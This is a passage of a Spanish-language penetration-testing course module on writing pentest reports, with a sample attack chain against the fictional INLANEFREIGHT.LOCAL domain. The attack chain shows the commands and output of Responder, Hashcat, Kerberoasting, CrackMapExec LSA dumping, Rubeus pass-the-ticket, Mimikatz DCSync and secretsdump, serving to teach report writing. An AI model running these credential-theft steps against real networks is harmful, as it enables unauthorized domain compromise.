Como se mencionó anteriormente, el reporte es el entregable principal que un cliente paga cuando contrata a tu empresa para realizar un penetration test. El reporte es nuestra oportunidad de mostrar nuestro trabajo durante la evaluación y proporcionar al cliente el máximo valor posible. Idealmente, el reporte estará libre de datos e información adicionales que "ensucien" el reporte o distraigan de los problemas que intentamos transmitir sobre el panorama general de su postura de seguridad que estamos tratando de pintar. Todo en el reporte debe tener una razón para estar allí, y no queremos abrumar al lector (por ejemplo, no pegues más de 50 páginas de output de consola). En esta sección, cubriremos los elementos clave de un reporte y cómo podemos estructurarlo mejor para mostrar nuestro trabajo y ayudar a nuestros clientes a priorizar la remediación.

---

## Prioritizing Our Efforts

Durante una evaluación, especialmente las grandes, nos enfrentaremos a mucho "ruido" que necesitamos filtrar para enfocar mejor nuestros esfuerzos y priorizar los hallazgos. Como testers, estamos obligados a divulgar todo lo que encontramos, pero cuando hay mucha información que nos llega a través de scans y enumeration, es fácil perderse o enfocarse en las cosas incorrectas y perder tiempo y potencialmente pasar por alto problemas de alto impacto. Es por eso que es esencial que entendamos el output que producen nuestras herramientas, tengamos pasos repetibles (como scripts u otras herramientas) para tamizar todos estos datos, procesarlos y eliminar falsos positivos o problemas informativos que podrían distraernos del objetivo de la evaluación. La experiencia y un proceso repetible son clave para que podamos filtrar todos nuestros datos y enfocar nuestros esfuerzos en hallazgos de alto impacto como fallas de remote code execution (RCE) o cualquier otra que pueda llevar a la divulgación de datos sensibles. Vale la pena (y es nuestro deber) informar hallazgos informativos, pero en lugar de gastar la mayor parte de nuestro tiempo validando estos problemas menores no explotables, tal vez quieras considerar consolidar algunos de ellos en categorías que muestren al cliente que eras consciente de que los problemas existían, pero que no pudiste explotarlos de manera significativa (por ejemplo, 35 variaciones diferentes de problemas con SSL/TLS, una tonelada de vulnerabilidades de DoS en una versión de PHP que ha llegado al EOL, etc.).

Cuando comenzamos en penetration testing, puede ser difícil saber qué priorizar, y podemos caer en madrigueras tratando de explotar una falla que no existe o conseguir que un PoC roto funcione. El tiempo y la experiencia ayudan aquí, pero también debemos apoyarnos en miembros senior del equipo y mentores para obtener ayuda. Algo en lo que podrías perder medio día podría ser algo que ellos hayan visto muchas veces y podrían decirte rápidamente si es un falso positivo o vale la pena seguir investigando. Incluso si no pueden darte una respuesta rápida en blanco y negro, al menos pueden señalarte en una dirección que te ahorre varias horas. Rodéate de personas con las que te sientas cómodo pidiendo ayuda y que no te hagan sentir como un idiota si no sabes todas las respuestas.

---

## Writing an Attack Chain

The attack chain es nuestra oportunidad de mostrar la cadena de explotación que tomamos para ganar un foothold, movernos lateralmente y comprometer el dominio. Puede ser un mecanismo útil para ayudar al lector a conectar los puntos cuando se utilizan múltiples hallazgos en conjunto y obtener una mejor comprensión de por qué ciertos hallazgos tienen la calificación de severidad que se les asigna. Por ejemplo, un hallazgo particular por sí solo puede ser `medium-risk` pero, combinado con uno o dos otros problemas, podría elevarse a `high-risk`, y esta sección es nuestra oportunidad de demostrar eso. Un ejemplo común es usar `Responder` para interceptar tráfico NBT-NS/LLMNR y retransmitirlo a hosts donde SMB signing no está presente. Puede volverse muy interesante si algunos hallazgos se pueden incorporar que de otro modo podrían parecer insignificantes, como usar una divulgación de información de algún tipo para ayudarte a través de un LFI para leer un archivo de configuración interesante, iniciar sesión en una aplicación externa y aprovechar la funcionalidad para ganar remote code execution y un foothold dentro de la red interna.

Hay múltiples maneras de presentar esto, y tu estilo puede diferir, pero vamos a caminar a través de un ejemplo. Comenzaremos con un resumen de la cadena de ataque y luego recorreremos cada paso junto con el output de los comandos de soporte y las capturas de pantalla para mostrar la cadena de ataque tan claramente como sea posible. Un bonus aquí es que podemos reutilizar esto como evidencia para nuestros hallazgos individuales, por lo que no tenemos que formatear las cosas dos veces y podemos copiar/pegar en el hallazgo relevante.

Vamos a empezar. Aquí asumiremos que fuimos contratados para realizar un Internal Penetration Test contra la empresa `Inlanefreight` con ya sea una VM dentro de la infraestructura del cliente o en su oficina en nuestra laptop conectada a un puerto de ethernet. Para nuestros propósitos, esta evaluación simulada se realizó desde un punto de vista `non-evasive` con un enfoque `grey box`, lo que significa que el cliente no estaba intentando activamente interferir con las pruebas y solo proporcionó rangos de red en el scope y nada más. Pudimos comprometer el dominio interno `INLANEFREIGHT.LOCAL` durante nuestra evaluación.

Nota: Una copia de esta cadena de ataque también se puede encontrar en el documento de muestra de reporte adjunto.

---

## Sample Attack Chain - INLANEFREIGHT.LOCAL Internal Penetration Test

Durante el Internal Penetration Test realizado contra Inlanefreight, el tester ganó un foothold en la red interna, se movió lateralmente y, finalmente, comprometió el dominio `INLANEFREIGHT.LOCAL` de Active Directory. La siguiente descripción ilustra los pasos tomados para pasar de un usuario anónimo no autenticado en la red interna a acceso de nivel de Domain Admin. La intención de esta cadena de ataque es demostrar a Inlanefreight el impacto de cada vulnerabilidad mostrada en este reporte y cómo encajan para demostrar el riesgo general para el entorno del cliente y ayudar a priorizar los esfuerzos de remediación (es decir, parchear dos fallas rápidamente podría desarmar la cadena de ataque mientras la empresa trabaja para remediar todos los problemas reportados). Si bien otros hallazgos mostrados en este reporte podrían aprovecharse para obtener un nivel similar de acceso, esta cadena de ataque muestra el camino inicial de menor resistencia tomado por el tester para lograr el compromiso del dominio.

1. El tester utilizó la herramienta [Responder](https://github.com/lgandx/Responder) para obtener un NTLMv2 password hash de un usuario del dominio, `bsmith`.

2. Este password hash fue crackeado exitosamente offline usando la herramienta [Hashcat](https://github.com/hashcat/hashcat) para revelar el cleartext password del usuario, lo que otorgó un foothold en el dominio `INLANEFREIGHT.LOCAL`, pero sin más privilegios que un usuario de dominio estándar.

3. El tester luego ejecutó la herramienta [BloodHound.py](https://github.com/fox-it/BloodHound.py), una versión en Python de la popular herramienta de recolección [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) para enumerar el dominio y crear representaciones visuales de rutas de ataque. Al revisar, el tester encontró que varios usuarios privilegiados existían en el dominio configurados con Service Principal Names (SPNs), que pueden aprovecharse para realizar un Kerberoasting attack y recuperar tickets TGS Kerberos para las cuentas que pueden crackearse offline usando `Hashcat` si se establece una contraseña débil. Desde aquí, el tester usó la herramienta [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) para llevar a cabo un targeted Kerberoasting attack contra la cuenta `mssqlsvc`, habiendo encontrado que la cuenta `mssqlsvc` tenía derechos de administrador local sobre el host `SQL01.INLANEFREIGHT.LOCAL`, que era un objetivo interesante en el dominio.

4. El tester crackeó exitosamente la contraseña de esta cuenta offline, revelando el valor en texto claro.

5. El tester se autenticó en el host `SQL01.INLANEFREIGHT.LOCAL` y recuperó una contraseña en texto claro del registro del host al descifrar LSA secrets para una cuenta (`srvadmin`), que estaba configurada para autologon.

6. Esta cuenta `srvadmin` tenía derechos de administrador local sobre todos los servidores (excepto los Domain Controllers) en el dominio, por lo que el tester inició sesión en el host `MS01.INLANEFREIGHT.LOCAL` y recuperó un Kerberos TGT ticket para un usuario conectado, `pramirez`. Este usuario era parte del grupo `Tier I Server Admins`, que otorgaba a la cuenta derechos de DCSync sobre el objeto de dominio. Este ataque puede utilizarse para recuperar el NTLM password hash de cualquier usuario en el dominio, resultando en el compromiso del dominio y la persistencia mediante un Golden Ticket.

7. El tester utilizó la herramienta [Rubeus](https://github.com/GhostPack/Rubeus) para extraer el Kerberos TGT ticket del usuario `pramirez` y realizar un Pass-the-Ticket attack para autenticarse como este usuario.

8. Finalmente, el tester realizó un DCSync attack después de autenticarse exitosamente con esta cuenta de usuario mediante la herramienta [Mimikatz](https://github.com/gentilkiwi/mimikatz

), lo que terminó en el compromiso del dominio.

### Detailed reproduction steps for this attack chain are as follows:

Al conectarse a la red, el tester inició la herramienta Responder y pudo capturar un password hash para el usuario `bsmith` al suplantar el tráfico NBT-NS/LLMNR en el segmento de la red local.

### Responder

```
```r
 sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

 <SNIP>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<SNIP>
```
```

El tester tuvo éxito en "crackear" este password hash offline usando la herramienta Hashcat y recuperar el valor de la contraseña en texto claro, obteniendo así un foothold para enumerar el dominio de Active Directory.

### Hashcat

```
```r
hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
```
```

El tester procedió a enumerar cuentas de usuario configuradas con Service Principal Names (SPNs) que pueden estar sujetas a un Kerberoasting attack. Esta técnica de movimiento lateral/escala de privilegios apunta a los SPNs (identificadores únicos que Kerberos usa para mapear una instancia de servicio a una cuenta de servicio). Cualquier usuario de dominio puede solicitar un ticket Kerberos para cualquier cuenta de servicio en el dominio, y el ticket está cifrado con el NTLM password hash de la cuenta de servicio, que potencialmente puede ser "crackeado" offline para revelar el valor de la contraseña en texto claro.

### GetUserSPNs

```
```r
GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
```
```

El tester luego ejecutó la versión en Python de la popular herramienta de enumeración de Active Directory BloodHound para recopilar información como usuarios, grupos, computadoras, ACLs, membresía de grupos, propiedades de usuarios y computadoras, sesiones de usuarios, acceso de administradores locales y más. Estos datos pueden luego importarse a una herramienta GUI para crear representaciones visuales de relaciones dentro del dominio y mapear "rutas de ataque" que pueden usarse para moverse lateralmente o escalar privilegios dentro de un dominio.

### Bloodhound

```
```r
sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```
```

El tester usó esta herramienta para verificar los privilegios de cada una de las cuentas SPN enumeradas en pasos anteriores y notó que solo la cuenta `mssqlsvc` tenía algún privilegio más allá de un usuario estándar de dominio. Esta cuenta tenía acceso de administrador local sobre el host `SQL01`. Los servidores SQL a menudo son objetivos de alto valor en un dominio ya que contienen credenciales privilegiadas, datos sensibles, o incluso pueden tener un usuario más privilegiado conectado.

![image](https://academy.hackthebox.com/storage/modules/162/bh_mssqlsvc.png)

El tester luego realizó un targeted Kerberoasting attack para recuperar el Kerberos TGS ticket para la cuenta de servicio `mssqlsvc`.

### GetUserSPNs

```
```r
GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               


$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
```
```

El tester tuvo éxito en "crackear" esta contraseña offline para revelar su valor en texto claro.

### Hashcat

```
```r
$hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
```
```

Esta contraseña pudo ser utilizada para acceder al host `SQL01` remotamente y recuperar un conjunto de credenciales en texto claro del registro para la cuenta `srvadmin`.

### CrackMapExec

```
```r
crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f

<SNIP>

SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
```
```

Usando estas credenciales, el tester inició sesión en el host `MS01` mediante Remote Desktop (RDP) y notó que otro usuario, `pramirez`, también estaba conectado.

### Logged In Users

```
```r
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
```
```

El tester verificó la herramienta BloodHound y notó que este usuario podía realizar el DCSync attack, una técnica para robar la base de datos de contraseñas de Active Directory aprovechando un protocolo que usan los domain controllers para replicar datos del dominio. Este ataque puede usarse para recuperar los NTLM password hashes de cualquier usuario en el dominio.

![image](https://academy.hackthebox.com/storage/modules/162/bh_pramirez.png)

Después de conectarse, el tester utilizó la herramienta Rubeus para ver todos los Kerberos tickets actualmente disponibles en el sistema y notó que los tickets para el usuario `pramirez` estaban presentes.

### Rubeus

```
```r
PS C:\htb> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                           | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM 
```
```

El tester luego utilizó esta herramienta para recuperar el Kerberos TGT ticket para este usuario, que luego puede usarse para realizar un "pass-the-ticket" attack y usar el TGT ticket robado para acceder a recursos en el dominio.

```
```r
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```
```

El usuario realizó el pass-the-ticket attack y se autenticó exitosamente como el usuario `pramirez`.

```
```r
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```
```

Esto se confirmó usando el comando `klist` para ver los Kerberos tickets en caché en la sesión actual.

### Cached Kerberos Tickets

```
```r
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
```

El tester luego utilizó este acceso para realizar un DCSync attack y recuperar el NTLM password hash para la cuenta de Administrador integrada, lo que llevó a un acceso de nivel de Enterprise Admin sobre el dominio.

### Mimikatz

```
```r
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```
```

El tester confirmó este acceso autenticándose en un Domain Controller en el dominio `INLANEFREIGHT.LOCAL`.

### CrackMapExec

```
```r
sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
```
```

Con este acceso, fue posible recuperar los NTLM password hashes para todos los usuarios en el dominio. El tester luego realizó el crackeo offline de estos hashes usando la herramienta Hashcat. Un análisis de contraseñas del dominio que muestra varias métricas puede encontrarse en los apéndices de este reporte.

### Dumping NTDS with SecretsDump

```
```r
secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::

<SNIP>
```
```

---

## Writing a Strong Executive Summary

El `Executive Summary` es una de las partes más importantes del reporte. Como se mencionó anteriormente, nuestros clientes están pagando en última instancia por el entregable del reporte, que tiene varios propósitos además de mostrar debilidades y pasos de reproducción que pueden ser utilizados por los equipos técnicos que trabajan en la remediación. El reporte probablemente será visto en parte por otros interesados internos, como el Auditoría Interna, la administración de IT y IT Security, la administración de nivel C e incluso el Board of Directors. El reporte puede ser utilizado para validar el financiamiento del año anterior para infosec o para solicitar financiamiento adicional para el año siguiente. Por esta razón, necesitamos asegurarnos de que haya contenido en el reporte que pueda ser entendido fácilmente por personas sin conocimientos técnicos.

### Key Concepts

El público objetivo para el `Executive Summary` es típicamente la persona que será responsable de asignar el presupuesto para solucionar los problemas que descubrimos. Para bien o para mal, algunos de nuestros clientes probablemente han estado tratando de obtener financiamiento para solucionar los problemas presentados en el reporte durante años y tienen la intención de usar el reporte como munición para finalmente hacer algo. Esta es nuestra mejor oportunidad para ayudarlos. Si perdemos a nuestro público aquí y hay limitaciones presupuestarias, el resto del reporte puede volverse rápidamente inútil. Algunas cosas clave a asumir (que pueden o no ser ciertas) para maximizar la efectividad del `Executive Summary` son:

- Debe ser obvio, pero esto debe ser escrito para alguien que no es técnico en absoluto. El barómetro típico para esto es "si tus padres no pueden entender cuál es el punto, entonces necesitas intentarlo de nuevo" (asumiendo que tus padres no son CISOs o sysadmins o algo por el estilo).
    
- El lector no hace esto todos los días. No saben qué hace Rubeus, qué significa password spraying, o cómo es posible que los tickets puedan otorgar diferentes tickets (o probablemente ni siquiera qué es un ticket, aparte de un pedazo de papel para entrar a un concierto o un juego de béisbol).
    
- Puede ser la primera vez que pasan por una penetration test.
    
- Al igual que el resto del mundo en la era de la gratificación instantánea, su capacidad de atención es pequeña. Cuando la perdemos, es extraordinariamente improbable que la recuperemos.
    
- En la misma línea, a nadie le gusta leer algo donde tienen que buscar en Google qué significan las cosas. Esas se llaman distracciones.
    

Hablemos de una lista de "do's and don'ts" cuando se escribe un `Executive Summary` efectivo.

### Do

- `When talking about metrics, be as specific as possible.` - Palabras como "varios," "múltiples," y "pocos" son ambiguas y podrían significar 6 o 500. Los ejecutivos no van a escarbar en el reporte para obtener esta información, así que si vas a hablar de esto, hazles saber lo que tienes; de lo contrario, vas a perder su atención. La razón más común por la que la gente no se compromete a un número específico es para dejarlo abierto en caso de que el consultor se haya perdido uno. Puedes hacer cambios menores en el lenguaje para tener en cuenta esto, como "aunque puede haber instancias adicionales de X, en el tiempo asignado a la evaluación, observamos 25 ocurrencias de X".
    
- `It's a summary. Keep it that way.` - Si escribiste más de 1.5-2 páginas, probablemente has sido demasiado prolijo. Examina los temas de los que hablaste y determina si pueden colapsarse en categorías de nivel superior que puedan caer en políticas o procedimientos específicos.
    
- `Describe the types of things you managed to access` - Tu audiencia puede no tener idea de lo que significa "Domain Admin," pero si mencionas que obtuviste acceso a una cuenta que te permitió tener en tus manos documentos de RRHH, sistemas bancarios y otros activos críticos, eso es comprensible universalmente.
    
- `Describe the general things that need to improve to mitigate the risks you discovered.` -

 Esto no debería ser "instala 3 parches y llámame en un año". Deberías estar pensando en términos de "¿qué proceso falló que permitió que una vulnerabilidad de cinco años no fuera parcheada en una cuarta parte del entorno?". Si haces password spraying y obtienes 500 hits en Welcome1!, cambiar las contraseñas de esas 500 cuentas es solo parte de la solución. La otra parte probablemente esté proporcionando al Help Desk una manera de establecer contraseñas iniciales más fuertes de manera eficiente.
    
